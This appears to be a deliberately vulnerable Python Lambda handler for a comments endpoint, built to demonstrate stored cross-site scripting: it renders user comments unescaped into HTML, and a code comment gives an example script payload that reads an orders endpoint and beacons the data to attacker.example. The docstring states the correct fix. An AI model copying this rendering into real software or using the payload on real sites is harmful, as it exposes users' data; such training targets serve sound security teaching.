"""
Comments endpoint.

⚠️  DELIBERATELY VULNERABLE  ⚠️
----------------------------------
VULN #3 — Stored Cross-Site Scripting (XSS).

POST /api/comments stores user-submitted text as-is. The companion
GET /api/comments returns it as raw HTML inside an `application/xhtml+xml`
response, so any <script> tag executes in the browser of any user who
loads it.

Real fix: store the text raw, but escape on render (or set
Content-Type: application/json + render via textContent in the
frontend).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent / "shared"))

from auth import extract_bearer, verify_token  # noqa: E402
from db import get_db, fetchall_dicts  # noqa: E402
from responses import html_response, json_response, parse_json_body  # noqa: E402


def lambda_handler(event, context):
    method = (event.get("httpMethod") or event.get("requestContext", {}).get("http", {}).get("method", "")).upper()

    if method == "POST":
        return _create_comment(event)
    if method == "GET":
        return _list_comments(event)
    return json_response(405, {"error": "method not allowed"})


def _create_comment(event: dict) -> dict:
    token = extract_bearer(event.get("headers") or {})
    if not token:
        return json_response(401, {"error": "missing bearer token"})
    try:
        claims = verify_token(token)
    except ValueError as e:
        return json_response(401, {"error": f"invalid token: {e}"})

    body = parse_json_body(event)
    text = body.get("body", "")
    if not text:
        return json_response(400, {"error": "comment body required"})

    db = get_db()
    db.execute(
        "INSERT INTO comments (user_id, body) VALUES (?, ?)",
        (claims["sub"], text),
    )
    db.commit()
    return json_response(201, {"status": "ok"})


def _list_comments(_event: dict) -> dict:
    db = get_db()
    cur = db.execute(
        "SELECT c.id, c.body, c.created_at, u.username "
        "FROM comments c JOIN users u ON u.id = c.user_id "
        "ORDER BY c.id DESC LIMIT 50"
    )
    rows = fetchall_dicts(cur.fetchall())

    # ---------------------- VULN #3: stored XSS ----------------------
    # We render user-submitted comment bodies straight into HTML. A
    # comment body of `<script>fetch('/api/orders/4').then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker.example/x', t))</script>`
    # exfiltrates data from any viewer's session.
    items = "".join(
        f"<li><b>{r['username']}</b> ({r['created_at']}): {r['body']}</li>"
        for r in rows
    )
    page = (
        "<!doctype html><html><head><title>Comments</title></head>"
        f"<body><h1>Recent comments</h1><ul>{items}</ul></body></html>"
    )
    # -----------------------------------------------------------------
    return html_response(200, page)
